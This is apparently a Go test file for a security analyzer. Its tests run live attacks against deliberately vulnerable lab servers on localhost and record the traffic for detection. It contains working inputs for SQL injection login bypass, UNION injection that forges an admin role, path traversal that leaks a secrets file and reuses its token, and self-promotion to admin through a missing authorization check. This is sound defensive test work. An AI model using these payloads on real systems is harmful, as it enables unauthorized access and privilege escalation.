package labtest

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"testing"
	"time"

	"mega-analyzer/pkg/ncer"
)

// TestLiveSQLiLoginServer drives the real classic-SQLi auth bypass against
// labs/servers/go/sqli-login (CWE-89) and feeds the resulting traffic into
// ncer. Skipped if the server isn't running locally.
func TestLiveSQLiLoginServer(t *testing.T) {
	const addr = "127.0.0.1:18004"
	if !reachable(addr, 300*time.Millisecond) {
		t.Skipf("sqli-login not reachable at %s -- start labs/servers (docker-compose.lab.yml) to run this test live", addr)
	}

	form := url.Values{"username": {"admin' -- "}, "password": {"anything"}}
	resp, err := httpClient.PostForm("http://"+addr+"/login", form)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 (SQLi bypass should have granted a session): %s", resp.StatusCode, body)
	}

	c := ncer.NewCollector(time.Now())
	c.ObserveHTTP(http.MethodPost, "http://"+addr+"/login", strconv.Itoa(resp.StatusCode), "", "")
	if _, err := c.Reconcile(); err != nil {
		t.Fatalf("ncer Reconcile: %v", err)
	}
}

// TestLivePathTraversalDownloadServer drives the traversal-to-admin-token
// chain against labs/servers/go/path-traversal-download (CWE-22) and feeds
// both requests into ncer. Skipped if the server isn't running locally.
func TestLivePathTraversalDownloadServer(t *testing.T) {
	const addr = "127.0.0.1:18005"
	if !reachable(addr, 300*time.Millisecond) {
		t.Skipf("path-traversal-download not reachable at %s -- start labs/servers (docker-compose.lab.yml) to run this test live", addr)
	}

	leakURL := "http://" + addr + "/files?name=../config/admin_secrets.txt"
	resp, err := httpClient.Get(leakURL)
	if err != nil {
		t.Fatalf("traversal request failed: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("traversal status = %d, want 200: %s", resp.StatusCode, body)
	}

	c := ncer.NewCollector(time.Now())
	c.ObserveHTTP(http.MethodGet, leakURL, strconv.Itoa(resp.StatusCode), "", "")

	// The leaked file's content is "bootstrap-token: <token>"; extract the
	// token the same way a real attacker script would.
	const prefix = "bootstrap-token: "
	text := string(body)
	idx := indexOf(text, prefix)
	if idx < 0 {
		t.Fatalf("leaked file did not contain expected %q prefix: %s", prefix, text)
	}
	token := trimToken(text[idx+len(prefix):])

	loginURL := "http://" + addr + "/login-with-token"
	payload, _ := json.Marshal(map[string]string{"token": token})
	loginResp, err := httpClient.Post(loginURL, "application/json", bytes.NewReader(payload))
	if err != nil {
		t.Fatalf("login-with-token failed: %v", err)
	}
	loginBody, _ := io.ReadAll(loginResp.Body)
	loginResp.Body.Close()
	if loginResp.StatusCode != http.StatusOK {
		t.Fatalf("login-with-token status = %d, want 200: %s", loginResp.StatusCode, loginBody)
	}

	c.ObserveHTTP(http.MethodPost, loginURL, strconv.Itoa(loginResp.StatusCode), "", "")
	if _, err := c.Reconcile(); err != nil {
		t.Fatalf("ncer Reconcile: %v", err)
	}
}

// TestLiveAdminIDORRoleServer drives the missing-authorization role-escalation
// against labs/servers/go/admin-idor-role (CWE-639): log in as a normal
// user, then self-promote to admin via the role-change endpoint, and feed
// both requests into ncer. Skipped if the server isn't running locally.
func TestLiveAdminIDORRoleServer(t *testing.T) {
	const addr = "127.0.0.1:18003"
	if !reachable(addr, 300*time.Millisecond) {
		t.Skipf("admin-idor-role not reachable at %s -- start labs/servers (docker-compose.lab.yml) to run this test live", addr)
	}

	loginURL := "http://" + addr + "/login"
	// Seed credentials from labs/servers/db/postgres/init/03-admin-idor-role.sql
	// (FAKE, local-lab-only): the "alice" account is seeded with role "user".
	loginPayload, _ := json.Marshal(map[string]string{"username": "alice", "password": "alice_lab_pw1"})
	loginResp, err := httpClient.Post(loginURL, "application/json", bytes.NewReader(loginPayload))
	if err != nil {
		t.Fatalf("login request failed: %v", err)
	}
	loginBody, _ := io.ReadAll(loginResp.Body)
	loginResp.Body.Close()
	if loginResp.StatusCode != http.StatusOK {
		t.Fatalf("login status = %d, want 200: %s", loginResp.StatusCode, loginBody)
	}

	var login struct {
		Token string `json:"token"`
	}
	if err := json.Unmarshal(loginBody, &login); err != nil || login.Token == "" {
		t.Fatalf("could not parse session token from login response: %s", loginBody)
	}

	c := ncer.NewCollector(time.Now())
	c.ObserveHTTP(http.MethodPost, loginURL, strconv.Itoa(loginResp.StatusCode), "", "")

	meURL := "http://" + addr + "/api/me"
	meReq, _ := http.NewRequest(http.MethodGet, meURL, nil)
	meReq.Header.Set("X-Session-Token", login.Token)
	meResp, err := httpClient.Do(meReq)
	if err != nil {
		t.Fatalf("me request failed: %v", err)
	}
	meBody, _ := io.ReadAll(meResp.Body)
	meResp.Body.Close()
	var me struct {
		ID int64 `json:"id"`
	}
	if err := json.Unmarshal(meBody, &me); err != nil {
		t.Fatalf("could not parse /api/me response: %s", meBody)
	}
	c.ObserveHTTP(http.MethodGet, meURL, strconv.Itoa(meResp.StatusCode), "", "")

	roleURL := "http://" + addr + "/api/users/" + strconv.FormatInt(me.ID, 10) + "/role"
	rolePayload, _ := json.Marshal(map[string]string{"role": "admin"})
	roleReq, _ := http.NewRequest(http.MethodPost, roleURL, bytes.NewReader(rolePayload))
	roleReq.Header.Set("X-Session-Token", login.Token)
	roleReq.Header.Set("Content-Type", "application/json")
	roleResp, err := httpClient.Do(roleReq)
	if err != nil {
		t.Fatalf("role-change request failed: %v", err)
	}
	roleBody, _ := io.ReadAll(roleResp.Body)
	roleResp.Body.Close()
	if roleResp.StatusCode != http.StatusOK {
		t.Fatalf("role-change status = %d, want 200 (a plain user should be able to self-promote due to the bug): %s", roleResp.StatusCode, roleBody)
	}
	c.ObserveHTTP(http.MethodPost, roleURL, strconv.Itoa(roleResp.StatusCode), "", "")

	authEvents := ncer.FromAuthorityContextGranular(ncer.AuthorityContext{
		Subject:  ncer.Subject{ID: "lab-client:alice", Kind: "http-client", Name: "alice"},
		Identity: ncer.Identity{Principal: "alice", Issuer: "labs-admin-idor-role"},
		Granted: []ncer.GrantedPermission{
			{Name: "role:user", Scope: "normal", Source: "login"},
		},
		Observed: []ncer.ObservedAction{
			{Action: "role_change_to_admin", Target: roleURL, TimestampMs: time.Now().UnixMilli()},
		},
	}, "labtest.admin-idor-role", time.Now().UnixMilli())
	c.ObserveAuthority(authEvents)

	if _, err := c.Reconcile(); err != nil {
		t.Fatalf("ncer Reconcile: %v", err)
	}
}

// TestLiveSQLiRawDjangoServer drives the UNION-based ORM-bypass against
// labs/servers/django/sqli-raw (CWE-89) and feeds it into ncer. Skipped if
// the server isn't running locally (this is the normal state without a live
// Django + MySQL deployment).
func TestLiveSQLiRawDjangoServer(t *testing.T) {
	const addr = "127.0.0.1:18007"
	if !reachable(addr, 300*time.Millisecond) {
		t.Skipf("sqli-raw not reachable at %s -- start labs/servers (docker-compose.lab.yml) to run this test live", addr)
	}

	payload := "nobody' UNION SELECT au.id, au.username, 'admin' FROM auth_user au WHERE au.username='moderator1' -- "
	reqURL := "http://" + addr + "/search?" + url.Values{"username": {payload}}.Encode()

	resp, err := httpClient.Get(reqURL)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 (UNION bypass should forge an admin role): %s", resp.StatusCode, body)
	}

	c := ncer.NewCollector(time.Now())
	c.ObserveHTTP(http.MethodGet, reqURL, strconv.Itoa(resp.StatusCode), "", "")
	if _, err := c.Reconcile(); err != nil {
		t.Fatalf("ncer Reconcile: %v", err)
	}
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func trimToken(s string) string {
	// The token is the first whitespace-delimited word after the prefix;
	// the leaked file has more explanatory lines after it, so stop at the
	// first newline/carriage-return/space rather than trailing-trimming the
	// whole rest of the file.
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' || s[i] == '\r' || s[i] == ' ' || s[i] == '\t' {
			return s[:i]
		}
	}
	return s
}
